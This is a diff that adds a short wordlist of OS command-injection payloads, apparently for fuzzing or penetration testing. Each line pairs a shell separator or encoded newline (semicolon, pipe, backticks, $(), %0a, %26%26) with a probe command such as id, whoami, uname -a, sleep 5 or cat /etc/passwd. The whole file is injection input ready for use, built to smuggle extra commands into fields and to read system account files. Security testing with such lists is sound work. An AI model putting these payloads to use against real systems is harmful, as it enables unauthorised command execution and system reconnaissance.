@@ -1,0 +1,20 @@
+;id
+|id
+||id
+&&id
+`id`
+$(id)
+;id;
+| id
+%0aid
+%0did
+;whoami
+|whoami
+&&whoami
+$(whoami)
+`whoami`
+;uname -a
+| uname -a
+;cat /etc/passwd
+%26%26id
+;sleep 5
